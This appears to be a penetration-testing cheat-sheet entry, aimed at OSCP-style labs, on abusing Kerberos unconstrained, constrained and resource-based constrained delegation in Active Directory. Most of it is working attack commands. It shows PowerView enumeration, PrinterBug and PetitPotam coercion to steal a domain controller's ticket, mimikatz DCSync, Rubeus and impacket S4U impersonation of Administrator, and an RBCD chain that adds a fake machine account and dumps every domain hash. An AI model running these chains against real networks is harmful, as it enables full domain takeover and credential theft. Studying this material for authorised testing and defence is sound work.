title: Kerberos Delegation — Unconstrained, Constrained, and RBCD
body:
Kerberos delegation lets a service impersonate users to access other services on their behalf. Three types — each with a different attack:

Unconstrained Delegation — the dangerous one. Any service configured for unconstrained delegation receives the full TGT of any user that authenticates to it. If you compromise a machine with unconstrained delegation, you can coerce a privileged account (like the DC's machine account) to authenticate to it, steal its TGT, and impersonate that account. This leads directly to DCSync / Domain Admin.

Constrained Delegation — the service can impersonate users but only to specific target services. If you control the service account, you can use S4U2Self + S4U2Proxy to get a service ticket as any user (including Domain Admin) to the allowed target services.

Resource-Based Constrained Delegation (RBCD) — the target resource decides who can delegate to it (msDS-AllowedToActOnBehalfOfOtherIdentity attribute). If you have GenericWrite or GenericAll on a computer object, you can set RBCD to let your controlled machine account impersonate any user to that computer. This is the most common lab technique because it only needs GenericWrite on a computer.

BloodHound edges to look for: AllowedToDelegate, TrustedToAuth, AllowedToAct (RBCD).
cmd:
# ══════════════════════════════════════════════════
# ENUMERATE ALL DELEGATION TYPES
# ══════════════════════════════════════════════════
Import-Module .\PowerView.ps1

# Unconstrained:
Get-DomainComputer -Unconstrained | Select Name,dnshostname
Get-DomainUser -AllowDelegation -AdminCount | Select SamAccountName

# Constrained (TrustedToAuth / protocol transition):
Get-DomainComputer -TrustedToAuth | Select Name,msds-allowedtodelegateto
Get-DomainUser -TrustedToAuth | Select SamAccountName,msds-allowedtodelegateto

# RBCD (who can delegate to which computer):
Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.ObjectAceType -match 'AllowedToAct'}

# BloodHound: Analysis → 'Shortest Path from Owned' — delegation edges will appear

# ══════════════════════════════════════════════════
# UNCONSTRAINED DELEGATION — COERCE + STEAL TGT
# ══════════════════════════════════════════════════
# You have a shell on a machine with unconstrained delegation.
# Goal: coerce the DC's machine account to authenticate here → steal its TGT

# Step 1 — Monitor for incoming TGTs (run in background on compromised machine):
# Rubeus:
.\Rubeus.exe monitor /interval:5 /nowrap

# Step 2 — Coerce DC machine account authentication (from Kali):
# PrinterBug (SpoolSample):
impacket-printerbug <domain>/<user>:'<pass>'@<dc-hostname> <your-compromised-machine>
# Or PetitPotam:
python3 PetitPotam.py -u '<user>' -p '<pass>' -d '<domain>' <your-compromised-machine> <dc-hostname>

# Step 3 — Rubeus catches the DC$ TGT — copy the base64 blob
# Import it:
.\Rubeus.exe ptt /ticket:<base64-TGT>
# Now impersonate the DC — run DCSync:
mimikatz # lsadump::dcsync /domain:<domain> /user:krbtgt

# ══════════════════════════════════════════════════
# CONSTRAINED DELEGATION — S4U IMPERSONATION
# ══════════════════════════════════════════════════
# You control a service account with constrained delegation
# (TrustedToAuth, with msds-allowedtodelegateto set)

# With the account's NTLM hash:
.\Rubeus.exe s4u /user:<service-account> /rc4:<ntlm-hash> /impersonateuser:Administrator /msdsspn:cifs/<target-server> /nowrap /ptt

# With the account's AES256 key (preferred — less noisy):
.\Rubeus.exe s4u /user:<service-account> /aes256:<aes256-key> /impersonateuser:Administrator /msdsspn:cifs/<target-server> /nowrap /ptt

# Then access target as Administrator:
ls \\<target-server>\C$
impacket-psexec -k <domain>/Administrator@<target-server>

# From Kali:
impacket-getST <domain>/<service-account> -hashes :<ntlm> -spn cifs/<target-server> -impersonate Administrator -dc-ip <dc-ip>
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass <domain>/Administrator@<target-server>

# ══════════════════════════════════════════════════
# RBCD — RESOURCE-BASED CONSTRAINED DELEGATION
# ══════════════════════════════════════════════════
# RECOGNITION — take this path when BloodHound shows you hold
#   GenericAll / GenericWrite / WriteDACL / WriteOwner over a COMPUTER
#   object (the edge target is a computer, not a user or group). That
#   control lets you write the computer's msDS-AllowedToActOnBehalfOf-
#   OtherIdentity and then impersonate ANY user to that computer.
#
#   *** THE FORK THAT DECIDES YOUR ENDGAME ***
#   Is that computer the DOMAIN CONTROLLER?
#     YES → a cifs/ ticket as Administrator ON THE DC lets you DCSync the
#           entire domain. THIS IS THE RESOURCED PATTERN. → go to DCSync.
#     NO  → member server. Ticket = local admin on THAT box only →
#           psexec/wmiexec in, loot, pivot.
#
# ── ALL-IMPACKET FLOW (cleanest, lab-standard) ──────
# PRECHECK — can you add a machine account? Default MachineAccountQuota=10
# so any domain user can. If MAQ=0 you CANNOT addcomputer — instead reset
# an EXISTING computer you control (GenericAll) and use it as delegate-from.
nxc ldap $dcip -u <user> -p '<pass>' -M maq

# 1) add a computer account you control (-hashes :NT for PtH):
impacket-addcomputer <domain>/<user> -dc-ip $dcip -hashes :<nthash> \
  -computer-name 'FAKE01$' -computer-pass 'FakePass123!'

# 2) write RBCD — target trusts FAKE01$ to act on behalf of others:
impacket-rbcd <domain>/<user> -dc-ip $dcip -hashes :<nthash> \
  -action write -delegate-to '<TARGET-COMPUTER>$' -delegate-from 'FAKE01$'
#   -delegate-to is the computer you CONTROL (the DC on Resourced).
#   confirm it took:  impacket-rbcd ... -action read

# 3) S4U — cifs/ service ticket impersonating Administrator:
impacket-getST <domain>/'FAKE01$':'FakePass123!' \
  -spn 'cifs/<target-computer>.<domain>' \
  -impersonate Administrator -dc-ip $dcip
#   GOTCHA: it saves e.g. Administrator@cifs_<t>.<dom>@<DOMAIN>.ccache
#   Export the EXACT name (ls *.ccache). A mismatched KRB5CCNAME makes
#   secretsdump print only 'Cleaning up...' with NO hashes — not an error,
#   just the wrong (missing) ticket. This trips everyone once.

# 4a) TARGET IS THE DC → DCSync the whole domain:
export KRB5CCNAME='Administrator@cifs_<target>.<domain>@<DOMAIN>.ccache'
impacket-secretsdump -k -no-pass <target-computer>.<domain> -just-dc
#   → Administrator + krbtgt hashes → evil-winrm -H / golden ticket.

# 4b) TARGET IS A MEMBER SERVER → shell on that box:
export KRB5CCNAME='Administrator@cifs_<target>.<domain>@<DOMAIN>.ccache'
impacket-psexec -k -no-pass <target-computer>.<domain>
#   (wmiexec -k -no-pass = quieter semi-interactive alternative)

# ── GOTCHAS ────────────────────────────
# Kerberos-only here → use the FQDN, never the IP (IP forces NTLM → fail).
# Clock skew → KRB_AP_ERR_SKEW. Sync first: sudo ntpdate <dc-ip>
# Cleanup (real engagements): impacket-rbcd ... -action flush, then delete
#   FAKE01$: impacket-addcomputer ... -computer-name FAKE01$ -delete
#
# ── ON-WINDOWS ALTERNATIVE (PowerView + Rubeus, no Kali) ──
Set-DomainObject -Identity <target-computer> -Set @{'msds-allowedtoactonbehalfofotheridentity'=([System.Security.Principal.SecurityIdentifier](Get-DomainComputer 'FAKE01$').objectsid).GetBinaryForm()}
.\Rubeus.exe s4u /user:FAKE01$ /rc4:<FAKE01-nthash> /impersonateuser:Administrator /msdsspn:cifs/<target>.<domain> /ptt
warn: Unconstrained delegation coercion requires a mechanism to force authentication — SpoolSample works only if the Spooler service is running on the DC (check: sc.exe \\<dc> query spooler). PetitPotam works on unpatched DCs. For constrained delegation, you need the service account's NTLM hash or AES key — get it via Kerberoasting (if the account has an SPN) or mimikatz (if you have a shell on the machine running that service). RBCD is the most reliable path on modern OSCP labs because it only needs GenericWrite on a computer object, which BloodHound surfaces frequently.

choices.label: Unconstrained: coerced DC TGT → DCSync everything
RBCD on the DC — DCSync the domain
RBCD on a member server — got admin shell
